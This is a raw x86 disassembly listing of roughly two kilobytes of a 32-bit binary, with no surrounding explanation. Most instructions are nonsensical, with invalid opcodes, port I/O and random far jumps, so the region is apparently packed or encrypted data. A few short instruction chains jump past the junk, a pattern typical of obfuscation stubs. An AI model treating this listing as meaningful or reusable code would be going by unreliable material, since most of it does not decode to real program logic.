  4100ca:	or     cl,al
  4100cc:	arpl   WORD PTR [ebp-0x6f],dx
  4100cf:	psraw  mm1,QWORD PTR [ecx+0x4f]
  4100d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100d4:	cmp    edi,DWORD PTR [edi-0x517af232]
  4100da:	pushf  
  4100db:	mov    dh,0x74
  4100dd:	test   esi,ecx
  4100df:	fisttp QWORD PTR [esp+edx*2]
  4100e2:	fsubr  QWORD PTR [ebp+0x7863070d]
  4100e8:	push   es
  4100e9:	out    dx,eax
  4100ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100eb:	xor    bl,BYTE PTR [eax+eax*2+0xc]
  4100ef:	mov    eax,0x6e4225ae
  4100f4:	clc    
  4100f5:	je     0x41015a
  4100f7:	ins    BYTE PTR es:[edi],dx
  4100f8:	sub    BYTE PTR [ebx+edi*2+0x54d87db4],al
  4100ff:	jmp    0x410094
  410101:	mov    DWORD PTR [ecx-0x64],eax
  410104:	pusha  
  410105:	adc    DWORD PTR [edx],ebp
  410107:	inc    esi
  410108:	and    bh,BYTE PTR [eax-0x41560e8c]
  41010e:	push   edi
  41010f:	push   edx
  410110:	ins    DWORD PTR es:[edi],dx
  410111:	mov    DWORD PTR [edi-0x5fa1d5f9],eax
  410117:	push   0xffffff9f
  410119:	pop    esp
  41011a:	sub    eax,0x5075ed11
  41011f:	dec    ecx
  410120:	push   eax
  410121:	mov    ah,0xc0
  410123:	xor    ecx,DWORD PTR [ebx-0x2b]
  410126:	sub    BYTE PTR [eax+0x26],bh
  410129:	jmp    0x19cd:0xb0d744e8
  410130:	push   ebx
  410131:	daa    
  410132:	sub    DWORD PTR [edi-0x5d],ecx
  410135:	sub    al,0x38
  410137:	pop    esi
  410138:	pop    es
  410139:	jae    0x4100fe
  41013b:	imul   ebp,DWORD PTR [edx+0x2a],0xffffffb8
  41013f:	jns    0x4100d2
  410141:	dec    esi
  410142:	hlt    
  410143:	jmp    0x84d:0xaa59a7d4
  41014a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41014b:	sbb    eax,0x2a137c3a
  410150:	mov    esp,0x2554e2db
  410155:	sahf   
  410156:	pop    es
  410157:	mov    edi,0xc7987b8c
  41015c:	imul   ebx,DWORD PTR [ebx+eax*2+0x25],0x7b79f2c5
  410164:	pop    eax
  410165:	xor    al,0x35
  410167:	daa    
  410168:	stos   BYTE PTR es:[edi],al
  410169:	lods   eax,DWORD PTR ds:[esi]
  41016a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41016c:	inc    eax
  41016d:	pop    esp
  41016e:	push   0x3a
  410170:	jl     0x410159
  410172:	jp     0x41012f
  410174:	sahf   
  410175:	rcr    BYTE PTR [ebx+0x24287fc9],0x3e
  41017c:	add    ebp,ebp
  41017e:	into   
  41017f:	or     DWORD PTR [ebx+0x0],edx
  410182:	xchg   DWORD PTR [ecx-0x60613ba4],edx
  410188:	fidivr WORD PTR [bp+si-0x5d]
  41018c:	add    ch,BYTE PTR [ebx+eiz*2+0x4f]
  410190:	lahf   
  410191:	xor    BYTE PTR [ebx-0x48290202],bh
  410197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410198:	push   edi
  410199:	or     ebp,DWORD PTR [ebx+eiz*4-0xaa7afb1]
  4101a0:	adc    al,0x6a
  4101a2:	mov    gs:0x94f9b683,eax
  4101a8:	and    bl,BYTE PTR [edi]
  4101aa:	xor    al,0x88
  4101ac:	dec    edx
  4101ad:	sub    esp,DWORD PTR ds:0x8f64de2c
  4101b3:	mov    ds:0xd1e6a1fd,eax
  4101b8:	mov    edi,DWORD PTR [eax+0x19622766]
  4101be:	shl    DWORD PTR [esi-0x406d7d46],1
  4101c4:	dec    ecx
  4101c5:	xor    eax,0xde1ed360
  4101ca:	mov    ds:0x12115409,al
  4101cf:	mov    fs:0xfff19e82,al
  4101d5:	enter  0xc990,0x20
  4101d9:	dec    esi
  4101da:	arpl   di,di
  4101dc:	sbb    DWORD PTR gs:[edi],0x6f3db8a6
  4101e3:	(bad)  
  4101e4:	jle    0x410186
  4101e6:	fs adc edi,edx
  4101e9:	das    
  4101ea:	pop    edx
  4101eb:	inc    edx
  4101ec:	jmp    0x8c195407
  4101f1:	pop    ds
  4101f2:	test   BYTE PTR [ebx],ch
  4101f4:	sbb    eax,0xf92eccee
  4101f9:	jge    0x410231
  4101fb:	cwde   
  4101fc:	or     cl,BYTE PTR [edi+0x64e29e6]
  410202:	mov    ah,0xc3
  410204:	test   DWORD PTR [edx+0xc],ebp
  410207:	das    
  410208:	lea    esi,[esi]
  41020a:	xchg   dh,dh
  41020c:	or     al,0xbd
  41020e:	ficomp WORD PTR [eax+0x18]
  410211:	(bad)  
  410212:	push   eax
  410213:	loop   0x41027e
  410215:	pop    edi
  410216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410217:	push   edx
  410218:	mov    esp,0x2036cf44
  41021d:	and    BYTE PTR [ecx+0x3c],bh
  410220:	inc    ecx
  410221:	and    esp,DWORD PTR ds:0x7432a7c0
  410227:	pop    ebp
  410228:	inc    edx
  410229:	cwde   
  41022a:	es mov ah,0x2b
  41022d:	sbb    eax,0xcdeaa6b1
  410232:	xchg   edx,eax
  410233:	xchg   DWORD PTR [ebp-0x7b888f96],ebp
  410239:	out    0xf2,al
  41023b:	xchg   esp,eax
  41023c:	rcpps  xmm7,xmm2
  41023f:	sub    al,BYTE PTR [edi]
  410241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410242:	pop    ebx
  410243:	das    
  410244:	aaa    
  410245:	xchg   ecx,eax
  410246:	push   esp
  410247:	or     DWORD PTR [ebx],ebp
  410249:	push   ecx
  41024a:	hlt    
  41024b:	stos   BYTE PTR es:[edi],al
  41024c:	pop    ss
  41024d:	loope  0x4101d2
  41024f:	adc    ah,BYTE PTR [edx]
  410251:	loop   0x410282
  410253:	dec    esi
  410254:	jl     0x41022f
  410256:	xor    ecx,ecx
  410258:	cli    
  410259:	clc    
  41025a:	mov    bh,0xc2
  41025c:	shl    BYTE PTR [esi],0x8e
  41025f:	sub    eax,0x8ef8c56
  410264:	add    al,0xa6
  410266:	out    0xcb,al
  410268:	outs   dx,DWORD PTR ds:[esi]
  410269:	fcmovnbe st,st(4)
  41026b:	jg     0x41027d
  41026d:	sahf   
  41026e:	or     BYTE PTR cs:[edi],bl
  410271:	pusha  
  410272:	jbe    0x4102a7
  410274:	inc    ebx
  410275:	or     eax,0x4dc37d54
  41027a:	xchg   ebp,eax
  41027b:	rol    DWORD PTR [esi-0x69f777de],0xb0
  410282:	mul    BYTE PTR [esi]
  410284:	jbe    0x41026e
  410286:	fild   WORD PTR [ecx+0x494c3a93]
  41028c:	in     eax,0x4e
  41028e:	dec    eax
  41028f:	mov    esp,esi
  410291:	(bad)  
  410292:	and    DWORD PTR [eax],esi
  410294:	sar    DWORD PTR [ebp+0x46],1
  410297:	in     eax,0xb3
  410299:	cmp    bl,BYTE PTR ds:0xa82c144e
  41029f:	dec    esp
  4102a0:	mov    ebx,0x386d9804
  4102a5:	div    dl
  4102a7:	std    
  4102a8:	fnstsw WORD PTR [edx]
  4102aa:	pop    es
  4102ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102ac:	dec    edx
  4102ad:	mov    ecx,ebx
  4102af:	jmp    0x8277baa
  4102b4:	call   FWORD PTR [eax*4+0x559717e]
  4102bb:	fcomp  QWORD PTR [esi]
  4102bd:	adc    eax,0xf205af46
  4102c2:	les    ebx,FWORD PTR [ecx+0x5e9e4898]
  4102c8:	mov    al,ds:0xbbc0ae31
  4102cd:	leave  
  4102ce:	push   ds
  4102cf:	fld    DWORD PTR [edi+0x53]
  4102d2:	div    ebx
  4102d4:	fistp  QWORD PTR [ebx]
  4102d6:	in     eax,0xd4
  4102d8:	stc    
  4102d9:	or     BYTE PTR [edx+eiz*8-0x45],al
  4102dd:	mov    eax,ds:0xadf04eb3
  4102e2:	or     BYTE PTR [edi+0x25],dh
  4102e5:	call   0xd700:0xb15472d4
  4102ec:	add    BYTE PTR [eax+0x7f6bfa35],cl
  4102f2:	jl     0x410323
  4102f4:	aaa    
  4102f5:	es xchg edx,eax
  4102f7:	and    al,0xa4
  4102f9:	or     edx,DWORD PTR [ebx-0x59fd3b93]
  4102ff:	xchg   edx,eax
  410300:	icebp  
  410301:	cdq    
  410302:	or     al,0x8b
  410304:	xchg   ecx,eax
  410305:	sti    
  410306:	adc    DWORD PTR [ebp+ebx*2+0x22],edi
  41030a:	adc    BYTE PTR [ecx],al
  41030c:	sahf   
  41030d:	ins    BYTE PTR es:[edi],dx
  41030e:	sub    dl,dh
  410310:	popf   
  410311:	ins    BYTE PTR es:[edi],dx
  410312:	sahf   
  410313:	push   cs
  410314:	xor    al,0x71
  410316:	add    BYTE PTR [ebp+eiz*2+0x3bfbcb8c],0xf6
  41031e:	mov    dh,0xb4
  410320:	shl    DWORD PTR [edi-0x25fc3f7e],0x67
  410327:	out    dx,al
  410328:	popa   
  410329:	jo     0x410360
  41032b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41032c:	pop    ebx
  41032d:	mov    eax,0x10a28bb2
  410332:	mov    dh,0xa2
  410334:	out    0x0,al
  410336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410337:	sub    eax,ebp
  410339:	add    eax,0xf5d33e56
  41033e:	jmp    0x4102c2
  410340:	retf   
  410341:	cmc    
  410342:	push   edi
  410343:	sbb    bh,BYTE PTR [edx+0x20b9002f]
  410349:	jmp    0xe26e:0x908c98bf
  410350:	push   ecx
  410351:	pop    esp
  410352:	mov    ah,dh
  410354:	mov    edx,DWORD PTR [esi+ebx*1-0x4ad2a122]
  41035b:	popf   
  41035c:	or     BYTE PTR [edi-0x753d13b0],al
  410362:	xor    eax,0xd90afce8
  410367:	int3   
  410368:	mov    BYTE PTR [edx-0xce6b4b4],dh
  41036e:	jecxz  0x4103be
  410370:	shr    BYTE PTR [esp+edi*1+0x2b],cl
  410374:	adc    eax,0x639c867b
  410379:	xchg   ecx,eax
  41037a:	mov    edi,0xea20c7c7
  41037f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410380:	fwait
  410381:	jg     0x410364
  410383:	and    ch,BYTE PTR [ebx]
  410385:	pop    edx
  410386:	push   esp
  410387:	pop    ebx
  410388:	loop   0x4103e3
  41038a:	xor    al,ch
  41038c:	jmp    0x2b1c:0xc0d5d177
  410393:	inc    esi
  410394:	iret   
  410395:	mov    DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fc85
  4103a6:	add    ecx,DWORD PTR ds:0x42fc89
  4103ac:	mov    DWORD PTR ds:0x42fc85,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e09c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xa6fb:0x64acbab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	push   eax
  4103db:	sub    eax,0x1dd2da2f
  4103e0:	rcl    bl,1
  4103e2:	xchg   edx,eax
  4103e3:	test   eax,0x11429e62
  4103e8:	stc    
  4103e9:	ret    0xdfa8
  4103ec:	cwde   
  4103ed:	fs mov esp,0x1dfc78df
  4103f3:	jnp    0x4103a0
  4103f5:	cld    
  4103f6:	push   eax
  4103f7:	push   eax
  4103f8:	mov    WORD PTR [edx-0x76],?
  4103fb:	add    al,0x5d
  4103fd:	add    eax,0xaf5ccace
  410402:	lahf   
  410403:	scas   eax,DWORD PTR es:[edi]
  410404:	out    0x3e,al
  410406:	js     0x41038e
  410408:	sahf   
  410409:	mov    al,0xcf
  41040b:	sbb    ecx,DWORD PTR [esi+ebp*1]
  41040e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41040f:	dec    eax
  410410:	sbb    dh,ah
  410412:	pop    edi
  410413:	sbb    esi,esi
  410415:	xchg   ebx,eax
  410416:	std    
  410417:	mov    ebx,0x3b911227
  41041c:	adc    DWORD PTR [ecx+0x58996691],ebx
  410422:	pop    esi
  410423:	scas   al,BYTE PTR es:[edi]
  410424:	hlt    
  410425:	cli    
  410426:	push   ecx
  410427:	test   eax,0xa4536879
  41042c:	jmp    0xa27a:0xedf848e4
  410433:	pushf  
  410434:	imul   ebp,DWORD PTR [ecx+ebx*2+0x2820d4be],0x43
  41043c:	call   0x2f0f:0x74e59774
  410443:	xor    al,0x48
  410445:	mov    edi,0x712d572b
  41044a:	add    ebp,DWORD PTR [edx+0x496902b6]
  410450:	test   al,0x4e
  410452:	or     al,0x5d
  410454:	push   ebp
  410455:	cld    
  410456:	jp     0x41046e
  410458:	jge    0x4104d6
  41045a:	dec    ecx
  41045b:	push   ds
  41045c:	dec    eax
  41045d:	pop    esp
  41045e:	cli    
  41045f:	add    dh,BYTE PTR [esi-0x3b]
  410462:	mov    ebx,0x2af52882
  410467:	mov    esi,0x27354c8d
  41046c:	lea    esp,ds:0xeabf672c
  410472:	pop    ebx
  410473:	dec    eax
  410474:	sbb    dl,al
  410476:	xor    DWORD PTR [ecx-0x13],ecx
  410479:	in     eax,dx
  41047a:	das    
  41047b:	clc    
  41047c:	sbb    al,0xe7
  41047e:	stc    
  41047f:	mov    DWORD PTR [ecx],eax
  410481:	loope  0x410410
  410483:	stos   DWORD PTR es:[edi],eax
  410484:	cmp    BYTE PTR [eax+0x13],bl
  410487:	lds    esi,FWORD PTR [ecx+0x754844fa]
  41048d:	push   edx
  41048e:	push   edx
  41048f:	push   edx
  410490:	inc    ebp
  410491:	aaa    
  410492:	(bad)  
  410493:	fwait
  410494:	push   0xffffffe6
  410496:	push   ebx
  410497:	xor    DWORD PTR [eax+0x5b],esp
  41049a:	pop    edx
  41049b:	aad    0xa7
  41049d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41049f:	dec    eax
  4104a0:	test   al,0x56
  4104a2:	loop   0x41044f
  4104a4:	scas   al,BYTE PTR es:[edi]
  4104a5:	fisub  WORD PTR [ebx-0x6053bb14]
  4104ab:	mov    cl,0x55
  4104ad:	inc    edx
  4104ae:	sub    al,0x8d
  4104b0:	lods   al,BYTE PTR ds:[esi]
  4104b1:	sbb    eax,0x31bf991c
  4104b6:	cmp    ebp,ecx
  4104b8:	adc    eax,eax
  4104ba:	(bad)  
  4104bb:	xor    dl,BYTE PTR [esi+0x32]
  4104be:	and    al,0xbc
  4104c0:	or     al,0x78
  4104c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104c3:	ret    0x3ca5
  4104c6:	hlt    
  4104c7:	jl     0x4104ca
  4104c9:	pop    ebx
  4104ca:	pop    ds
  4104cb:	into   
  4104cc:	in     al,dx
  4104cd:	frstpm(287 only) 
  4104cf:	inc    ebx
  4104d0:	pop    ecx
  4104d1:	pop    ecx
  4104d2:	std    
  4104d3:	dec    esp
  4104d4:	pop    ebx
  4104d5:	pop    es
  4104d6:	cdq    
  4104d7:	adc    eax,0x462fcc51
  4104dc:	jbe    0x4104e9
  4104de:	les    esp,FWORD PTR [ebx+eax*8+0x6280cae2]
  4104e5:	arpl   WORD PTR ds:0x6604e897,bp
  4104eb:	xor    al,0x57
  4104ed:	aas    
  4104ee:	dec    ebx
  4104ef:	out    0x8a,al
  4104f1:	nop
  4104f2:	js     0x410481
  4104f4:	packuswb mm4,mm1
  4104f7:	add    al,0xc8
  4104f9:	fdivr  QWORD PTR [ebx]
  4104fb:	ja     0x41054f
  4104fd:	fsub   QWORD PTR cs:[ecx]
  410500:	mov    ah,dh
  410502:	int    0xc1
  410504:	arpl   WORD PTR [ebx+0x75],di
  410507:	and    BYTE PTR [edi+0xe514f20],0x7
  41050e:	sahf   
  41050f:	std    
  410510:	or     BYTE PTR [edi+0x6e],0x90
  410514:	call   0x56423909
  410519:	ror    cl,cl
  41051b:	ror    al,cl
  41051d:	fistp  QWORD PTR [eax-0x76]
  410521:	mov    esi,0x4fcb41c
  410526:	repz dec eax
  410528:	icebp  
  410529:	in     eax,dx
  41052a:	jecxz  0x41057d
  41052c:	sbb    ah,BYTE PTR ds:0x94b87c07
  410532:	mov    WORD PTR [edi],ss
  410534:	sahf   
  410535:	or     eax,eax
  410537:	imul   ebx,DWORD PTR [ebx-0x5a],0xffffff8c
  41053b:	popf   
  41053c:	inc    esp
  41053d:	mov    esi,0xfcdfe435
  410542:	sub    ebp,ecx
  410544:	aam    0x85
  410546:	jl     0x41056e
  410548:	sbb    BYTE PTR [ecx],dl
  41054a:	mov    ds:0xc9089328,al
  41054f:	xchg   esi,eax
  410550:	rcl    ecx,1
  410552:	imul   edx,DWORD PTR [esp+eiz*2],0x2c8dbd32
  410559:	sub    DWORD PTR [edx],ebx
  41055b:	stos   DWORD PTR es:[edi],eax
  41055c:	mov    bh,0xc8
  41055e:	loope  0x4105a5
  410560:	adc    al,0x6b
  410562:	push   esi
  410563:	fs or  al,0x23
  410566:	and    BYTE PTR [ecx+0x22],bh
  410569:	jb     0x410588
  41056b:	call   0xaaa86138
  410570:	cmp    BYTE PTR [ecx+0x3],0xed
  410574:	shr    ch,cl
  410576:	neg    BYTE PTR [ecx]
  410578:	hlt    
  410579:	scas   ax,WORD PTR es:[edi]
  41057b:	jae    0x410559
  41057d:	ins    DWORD PTR es:[edi],dx
  41057e:	jp     0x41059b
  410580:	xor    ecx,DWORD PTR [ecx+0x125c6735]
  410586:	imul   esp,DWORD PTR [esi+eax*8+0x3d8e6f31],0xffffff8a
  41058e:	gs mov ecx,0x8cd9b129
  410594:	sbb    eax,0x93289463
  410599:	push   cs
  41059a:	int3   
  41059b:	mov    BYTE PTR [edx+ebp*4-0x5578333a],bh
  4105a2:	mov    edi,0xdacf64ed
  4105a7:	add    BYTE PTR [ebp+0x1c511ff],ah
  4105ad:	das    
  4105ae:	lock outs dx,DWORD PTR ds:[esi]
  4105b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105b1:	jge    0x410573
  4105b3:	iret   
  4105b4:	or     ch,cl
  4105b6:	fwait
  4105b7:	dec    BYTE PTR [ebp+0x18333fe7]
  4105bd:	repnz pop ds
  4105bf:	cmp    DWORD PTR [ecx-0x57],ebx
  4105c2:	ds test al,al
  4105c5:	mov    ecx,0xed12316d
  4105ca:	ss dec esp
  4105cc:	in     al,dx
  4105cd:	inc    esi
  4105ce:	fmulp  st(2),st
  4105d0:	in     al,dx
  4105d1:	jp     0x4105ee
  4105d3:	enter  0x830f,0x0
  4105d7:	jmp    0x22ba:0x184adae2
  4105de:	mov    dl,0x62
  4105e0:	clc    
  4105e1:	jo     0x41061f
  4105e3:	jmp    0xa83bb50d
  4105e8:	ret    0xa52e
  4105eb:	pop    eax
  4105ec:	dec    edx
  4105ed:	popa   
  4105ee:	gs jmp 0xb811ff78
  4105f4:	fnstcw WORD PTR [esi+0x1e]
  4105f7:	adc    DWORD PTR [edi-0x5733ddaf],ebx
  4105fd:	push   0x1e
  4105ff:	ins    BYTE PTR es:[edi],dx
  410600:	aam    0xd2
  410602:	jge    0x4105ac
  410604:	fdiv   QWORD PTR [ecx+0x4d79dc7f]
  41060a:	fisub  DWORD PTR [eax]
  41060c:	repnz mov ecx,edi
  41060f:	int3   
  410610:	and    edx,esi
  410612:	(bad)  
  410613:	xlat   BYTE PTR ds:[ebx]
  410614:	mov    al,ds:0x2eae4a95
  410619:	mov    ds:0xd59abe5d,eax
  41061e:	jno    0x4105fd
  410620:	dec    eax
  410621:	fiadd  WORD PTR [eax]
  410623:	mov    dl,0xcd
  410625:	pop    edi
  410626:	sub    BYTE PTR [esi+0x196dded5],cl
  41062c:	jle    0x410673
  41062e:	mov    DWORD PTR [edx-0x508f3015],esi
  410634:	or     ebp,ebx
  410636:	ins    DWORD PTR es:[edi],dx
  410637:	sahf   
  410638:	fmul   QWORD PTR [esi+0xc]
  41063b:	sub    al,0x9d
  41063d:	retf   
  41063e:	lds    edx,FWORD PTR [eax]
  410640:	inc    edx
  410641:	push   edi
  410642:	or     al,0x11
  410644:	int3   
  410645:	bnd jg 0x4106bd
  410648:	jmp    0xe809:0xb1313f7c
  41064f:	into   
  410650:	test   DWORD PTR [esi-0x3cb30a42],edi
  410656:	mov    bl,0x79
  410658:	test   DWORD PTR [ebx-0x15],ecx
  41065b:	out    dx,al
  41065c:	sahf   
  41065d:	xor    ch,0x40
  410660:	inc    edi
  410661:	repz dec DWORD PTR [eax+0x6be6cdf5]
  410668:	je     0x410690
  41066a:	leave  
  41066b:	xor    BYTE PTR [eax+0x6a],0xb4
  41066f:	sub    al,bl
  410671:	sub    al,0x5e
  410673:	lock lods al,BYTE PTR ds:[esi]
  410675:	div    DWORD PTR [esp+edx*2+0x47]
  410679:	mov    ecx,0x70e2c6fd
  41067e:	xor    al,0xba
  410680:	aas    
  410681:	push   ebx
  410682:	adc    cl,BYTE PTR [edx+0x75]
  410685:	(bad)  
  410686:	dec    ebx
  410687:	mov    esp,ebx
  410689:	mov    ebx,0x6851a0d3
  41068e:	inc    esp
  41068f:	or     DWORD PTR [ebx-0x57],esp
  410692:	xor    edi,DWORD PTR [ebx-0xf20d6d3]
  410698:	std    
  410699:	and    DWORD PTR [edi+eax*1+0x65af8397],esp
  4106a0:	icebp  
  4106a1:	inc    edi
  4106a2:	in     eax,dx
  4106a3:	(bad)  
  4106a4:	fst    DWORD PTR [edi+esi*1+0x36]
  4106a8:	je     0x4106b3
  4106aa:	pop    edi
  4106ab:	arpl   bp,cx
  4106ad:	mov    ah,0x11
  4106af:	ja     0x4106f4
  4106b1:	and    eax,0x618b91fd
  4106b6:	mov    di,0xeb2e
  4106ba:	fdiv   QWORD PTR [esi-0x871317a]
  4106c0:	sbb    edx,ebx
  4106c2:	stos   BYTE PTR es:[edi],al
  4106c3:	test   eax,0x8032a040
  4106c8:	cmp    DWORD PTR [esp+edx*4-0x6d1e6351],ebp
  4106cf:	retf   0x2b70
  4106d2:	xchg   esi,eax
  4106d3:	pop    ds
  4106d4:	ficom  WORD PTR [edx+eiz*1]
  4106d7:	add    esi,DWORD PTR [edx+0x4aa2c51e]
  4106dd:	jge    0x4106d4
  4106df:	cli    
  4106e0:	xchg   esi,eax
  4106e1:	jge    0x410753
  4106e3:	mov    al,BYTE PTR [edi-0x2831212e]
  4106e9:	retf   0xa9e8
  4106ec:	pop    eax
  4106ed:	push   ds
  4106ee:	ss je  0x41073d
  4106f1:	inc    ebp
  4106f2:	ds test eax,0xfe11dca3
  4106f8:	jg     0x4106d0
  4106fa:	loop   0x410766
  4106fc:	and    BYTE PTR [ecx],dl
  4106fe:	add    ebx,DWORD PTR [ebp+0x7a7bb9b7]
  410704:	pop    ebx
  410705:	push   0x59f03a8f
  41070a:	js     0x410766
  41070c:	into   
  41070d:	jmp    0x41073e
  41070f:	loope  0x4106d3
  410711:	sar    DWORD PTR [edx+0x22e7b4e4],cl
  410717:	(bad)  
  410718:	pusha  
  410719:	mov    ah,bh
  41071b:	push   edi
  41071c:	(bad)  
  41071e:	xlat   BYTE PTR ds:[ebx]
  41071f:	repnz cmp bh,BYTE PTR [eax-0x6d]
  410723:	push   ecx
  410724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410725:	cwde   
  410726:	retw   0x744f
  41072a:	and    eax,0x45de036e
  41072f:	ss xchg edi,eax
  410731:	in     al,0xa2
  410733:	scas   al,BYTE PTR es:[edi]
  410734:	xor    ah,BYTE PTR [ecx-0x58065e28]
  41073a:	or     bh,ah
  41073c:	je     0x410726
  41073e:	xchg   edx,eax
  41073f:	retf   0x64d3
  410742:	imul   ebx,DWORD PTR [ebx+0x4f],0x4a
  410746:	fwait
  410747:	add    BYTE PTR ds:[ecx-0x4],cl
  41074b:	repz dec edi
  41074d:	sub    eax,0x6acd8c7f
  410752:	push   0xf91a8aac
  410757:	repnz sbb BYTE PTR [ebx-0x6a],ch
  41075b:	ins    DWORD PTR es:[edi],dx
  41075c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41075d:	in     eax,dx
  41075e:	out    0x82,al
  410760:	mov    ebx,0x40d573b8
  410765:	hlt    
  410766:	mov    dh,0xea
  410768:	std    
  410769:	jnp    0x41074b
  41076b:	outs   dx,DWORD PTR ds:[esi]
  41076c:	(bad)  
  41076d:	(bad)  
  41076f:	xchg   ebx,eax
  410770:	add    al,0x98
  410772:	ins    BYTE PTR es:[edi],dx
  410773:	sti    
  410774:	(bad)  
  410775:	xlat   BYTE PTR ds:[ebx]
  410776:	lods   al,BYTE PTR ds:[esi]
  410777:	mov    dh,0xb3
  410779:	xchg   DWORD PTR [eax-0x3452ceee],ebp
  41077f:	xlat   BYTE PTR ds:[ebx]
  410780:	call   0xb7780998
  410785:	int    0x3
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107a9:	jae    0x4107eb
  4107ab:	int3   
  4107ac:	mov    eax,DWORD PTR [esi+0x70]
  4107af:	jo     0x410754
  4107b1:	jge    0x410823
  4107b3:	jo     0x4107eb
  4107b5:	pusha  
  4107b6:	imul   esi,eax,0xffffffa2
  4107b9:	xchg   ebp,eax
  4107ba:	scas   eax,DWORD PTR es:[edi]
  4107bb:	outs   dx,BYTE PTR ds:[esi]
  4107bc:	fucomi st,st(1)
  4107be:	rcl    BYTE PTR [edi*2+0x2a2a0c4c],cl
  4107c5:	inc    ebp
  4107c6:	ins    BYTE PTR es:[edi],dx
  4107c7:	sbb    dl,BYTE PTR [esi+eiz*2]
  4107ca:	lds    esi,FWORD PTR [ebx+edi*2+0x41]
  4107ce:	xor    BYTE PTR [eax+0x2e4079dd],0x52
  4107d5:	in     al,dx
  4107d6:	push   ebx
  4107d7:	int3   
  4107d8:	adc    dl,bl
  4107da:	or     al,0x7
  4107dc:	cli    
  4107dd:	inc    esi
  4107de:	test   al,0x58
  4107e0:	ror    BYTE PTR [eax],1
  4107e2:	mov    WORD PTR [ecx+edi*2+0x43],?
  4107e6:	aas    
  4107e7:	jg     0x410865
  4107e9:	xchg   edi,eax
  4107ea:	mov    ebp,DWORD PTR [edi-0x1]
  4107ed:	iret   
  4107ee:	or     esp,esp
  4107f0:	sbb    eax,0x8859b13
  4107f5:	push   edx
  4107f6:	mov    bh,0x27
  4107f8:	test   ch,al
  4107fa:	test   DWORD PTR [eax+0x4a09a770],ebp
  410800:	retf   0x8625
  410803:	(bad)  [edi+0x51b032fe]
  410809:	dec    ebp
  41080a:	and    DWORD PTR [esi-0x64],esp
  41080d:	rol    BYTE PTR [ebx-0x63],0xfb
  410811:	sbb    BYTE PTR [edx],dh
  410813:	adc    esp,0x2e
  410816:	push   cs
  410817:	push   ds
  410818:	pop    edx
  410819:	lods   eax,DWORD PTR ds:[esi]
  41081a:	stc    
  41081b:	or     al,0x80
  41081d:	fs xchg ebx,eax
  41081f:	fsubr  st,st(5)
  410821:	adc    BYTE PTR [ebx],al
  410823:	shr    DWORD PTR ds:0xba9e6571,0xaa
  41082a:	jmp    0x109e:0x856f1a04
  410831:	call   0x3dc3:0x5ea0a8c4
  410838:	jmp    0x934d09c9
  41083d:	mov    edx,0x6f3e23ab
  410842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410843:	int    0xf3
  410845:	(bad)  
  410846:	push   0xffffffa0
  410848:	sub    al,0x70
  41084a:	xchg   esi,eax
  41084b:	out    dx,al
  41084c:	outs   dx,DWORD PTR ds:[esi]
  41084d:	test   al,0x38
  41084f:	sub    cl,BYTE PTR [eax]
  410851:	xor    DWORD PTR [ebx],ecx
  410853:	push   edx
  410854:	ds and al,0xa2
  410857:	jge    0x410863
  410859:	mov    esi,ss
  41085b:	in     al,0x14
  41085d:	fwait
  41085e:	sub    DWORD PTR [edx+0x5b503f1e],esp
  410864:	push   esp
  410865:	repz out dx,al
  410867:	bound  ebx,QWORD PTR [ebp+0x69]
  41086a:	int3   
  41086b:	sub    eax,0xe5fd2ca4
  410870:	dec    esp
  410871:	sub    edx,DWORD PTR [edi+0x22]
  410874:	jne    0x410801
  410876:	sar    ebx,1
  410878:	popa   
  410879:	inc    esp
  41087a:	test   BYTE PTR [ebx+0x20f28830],ah
  410880:	jnp    0x410893
  410882:	and    eax,0xb4d9bb9e
  410887:	cmp    BYTE PTR [edi],bl
  410889:	mov    dl,0x6e
  41088b:	add    edx,DWORD PTR [esi-0x47f9af29]
  410891:	std    
  410892:	cmp    BYTE PTR [eax+eax*8+0x21],0xd6
  410897:	test   BYTE PTR ds:[edi],ah
  41089a:	xchg   esi,eax
  41089b:	sahf   
  41089c:	fs lock in eax,0xe1
  4108a0:	pop    ebp
  4108a1:	je     0x4108d9
  4108a3:	xor    cl,dh
  4108a5:	inc    DWORD PTR [eax*8+0x5bc588c9]
  4108ac:	daa    
  4108ad:	mov    eax,ds:0xaaa7ba07
  4108b2:	shl    DWORD PTR [edi+0xdae3267],0x35
  4108b9:	add    dl,BYTE PTR [esi]
  4108bb:	and    bl,BYTE PTR [ebx-0x3c0adb0b]
